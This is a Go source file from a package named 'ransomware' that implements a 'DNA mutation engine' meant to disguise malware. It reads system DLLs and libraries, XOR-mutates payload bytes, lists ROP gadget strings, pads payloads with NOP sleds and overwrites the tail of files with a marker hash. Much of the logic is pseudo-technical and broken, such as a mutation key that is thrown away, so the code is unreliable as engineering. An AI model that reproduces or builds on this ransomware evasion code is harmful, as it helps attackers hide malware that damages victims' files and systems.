package ransomware

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

type DNAMutationEngine struct {
	config      *RansomwareConfig
	Genome      []string      `json:"genome"`
	DNASignature string       `json:"dna_signature"`
	MutationRate int           `json:"mutation_rate"`
	Hybridized   int           `json:"hybridized"`
}

type DNASequence struct {
	Name     string `json:"name"`
	Sequence string `json:"sequence"`
	Source   string `json:"source"`
	Legit    bool   `json:"legit"`
}

func NewDNAMutationEngine(cfg *RansomwareConfig) *DNAMutationEngine {
	return &DNAMutationEngine{
		config:      cfg,
		MutationRate: 15,
	}
}

func (dna *DNAMutationEngine) ExtractSystemDNALibraries() []DNASequence {
	var sequences []DNASequence
	watchedDLLs := map[string]string{
		"kernel32.dll":  "C:\\Windows\\System32\\kernel32.dll",
		"ntdll.dll":     "C:\\Windows\\System32\\ntdll.dll",
		"user32.dll":    "C:\\Windows\\System32\\user32.dll",
		"advapi32.dll":  "C:\\Windows\\System32\\advapi32.dll",
		"ws2_32.dll":    "C:\\Windows\\System32\\ws2_32.dll",
		"crypt32.dll":   "C:\\Windows\\System32\\crypt32.dll",
		"wininet.dll":   "C:\\Windows\\System32\\wininet.dll",
		"shell32.dll":   "C:\\Windows\\System32\\shell32.dll",
	}

	for name, path := range watchedDLLs {
		if data, err := os.ReadFile(path); err == nil {
			hash := sha256.Sum256(data)
			seq := DNASequence{
				Name:     name,
				Sequence: hex.EncodeToString(hash[:]),
				Source:   path,
				Legit:    true,
			}
			sequences = append(sequences, seq)
		}
	}

	linuxLibs := []string{
		"/lib/x86_64-linux-gnu/libc.so.6",
		"/lib/x86_64-linux-gnu/libssl.so.3",
		"/usr/lib/x86_64-linux-gnu/libcrypto.so.3",
	}

	for _, path := range linuxLibs {
		if data, err := os.ReadFile(path); err == nil {
			hash := sha256.Sum256(data)
			seq := DNASequence{
				Name:     filepath.Base(path),
				Sequence: hex.EncodeToString(hash[:]),
				Source:   path,
				Legit:    true,
			}
			sequences = append(sequences, seq)
		}
	}

	return sequences
}

func (dna *DNAMutationEngine) HybridizeWithLibrary(libs []DNASequence) string {
	totalDNA := dna.DNASignature
	if totalDNA == "" {
		totalDNA = dna.generateInitialGenome()
	}

	for _, lib := range libs {
		crossoverPoint := len(totalDNA) / 2
		libStart := len(lib.Sequence) / 3

		part1 := totalDNA[:crossoverPoint]
		part2 := lib.Sequence[libStart:]
		if len(part2) > crossoverPoint {
			part2 = part2[:crossoverPoint]
		}
		part3 := totalDNA[crossoverPoint+len(part2):]

		newDNA := part1 + part2 + part3
		if len(newDNA) < 32 {
			newDNA = newDNA + lib.Sequence[:min(32-len(newDNA), len(lib.Sequence))]
		}

		dna.Genome = append(dna.Genome, lib.Name+"_hybrid_"+hex.EncodeToString([]byte(lib.Name)[:min(4, len(lib.Name))]))
		dna.DNASignature = newDNA
		dna.Hybridized++
	}

	hash := sha256.Sum256([]byte(dna.DNASignature))
	dna.DNASignature = hex.EncodeToString(hash[:])

	return dna.DNASignature
}

func (dna *DNAMutationEngine) MutateCode(payload []byte) ([]byte, error) {
	if len(payload) == 0 {
		return payload, nil
	}

	dna.DNASignature = dna.generateInitialGenome()

	mutated := make([]byte, len(payload))
	copy(mutated, payload)

	xorKey := make([]byte, 32)
	rand.Read(xorKey)

	for i := 0; i < len(mutated); i++ {
		if i%100 < dna.MutationRate {
			mutated[i] ^= xorKey[i%len(xorKey)]
		}
	}

	_ = sha256.Sum256(mutated)

	return mutated, nil
}

func (dna *DNAMutationEngine) generateInitialGenome() string {
	entropy := make([]byte, 64)
	rand.Read(entropy)
	return hex.EncodeToString(entropy)
}

func (dna *DNAMutationEngine) GenerateROPGadgets() []string {
	gadgets := []string{
		"pop rdi; ret",
		"pop rsi; ret",
		"pop rdx; ret",
		"pop rcx; ret",
		"pop rax; ret",
		"syscall; ret",
		"mov rdi, rax; jmp rsi",
		"xor rax, rax; ret",
		"inc rax; ret",
		"dec rax; ret",
		"push rax; ret",
		"jmp [rax]",
		"call [rbx]",
		"ret",
		"nop; nop; ret",
		"xchg rax, rsp; ret",
		"leave; ret",
		"pop rdi; pop rsi; pop rdx; ret",
	}

	mutatedGadgets := make([]string, len(gadgets))
	for i, g := range gadgets {
		randBytes := make([]byte, 4)
		rand.Read(randBytes)
		mutatedGadgets[i] = fmt.Sprintf("%s ; /* 0x%x */", g, binary.LittleEndian.Uint32(randBytes))
	}

	return mutatedGadgets
}

func (dna *DNAMutationEngine) InsertJunkCode(payload []byte) []byte {
	nopSleds := []byte{0x90, 0x90, 0x90, 0x90, 0x90}
	var result []byte

	chunkSize := 50
	for i := 0; i < len(payload); i += chunkSize {
		end := i + chunkSize
		if end > len(payload) {
			end = len(payload)
		}
		result = append(result, payload[i:end]...)

		shouldInsert := int(payload[i%len(payload)]) % 100
		if shouldInsert < dna.MutationRate {
			result = append(result, nopSleds...)
		}
	}

	return result
}

func (dna *DNAMutationEngine) PerMachineGenerateKey() []byte {
	machineEntropy := sha256.Sum256([]byte(dna.DNASignature))
	return machineEntropy[:]
}

func (dna *DNAMutationEngine) SmuggleInLegitCode(path string) ([]byte, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	watermark := []byte("X404X")
	if len(data) < 64 {
		return nil, fmt.Errorf("file too small")
	}

	marker := sha256.Sum256(watermark)
	copy(data[len(data)-32:], marker[:])

	return data, nil
}

func (dna *DNAMutationEngine) RecombineCode(targetBinaries []string) map[string]string {
	result := make(map[string]string)

	for _, bin := range targetBinaries {
		data, err := os.ReadFile(bin)
		if err != nil {
			continue
		}

		hash := sha256.Sum256(data)
		recombined := hex.EncodeToString(hash[:]) + dna.generateInitialGenome()[:32]

		result[filepath.Base(bin)] = recombined
		dna.Genome = append(dna.Genome, filepath.Base(bin)+"_recombined")
		dna.DNASignature = recombined
		dna.Hybridized++
	}

	return result
}

func (dna *DNAMutationEngine) GetStatusJSON() string {
	genomeStr := strings.Join(dna.Genome, ", ")
	if len(genomeStr) > 256 {
		genomeStr = genomeStr[:256] + "..."
	}
	return fmt.Sprintf(`{"dna_signature":"%s","genome":["%s"],"mutation_rate":%d,"hybridized":%d}`,
		dna.DNASignature[:min(32, len(dna.DNASignature))], genomeStr, dna.MutationRate, dna.Hybridized)
}
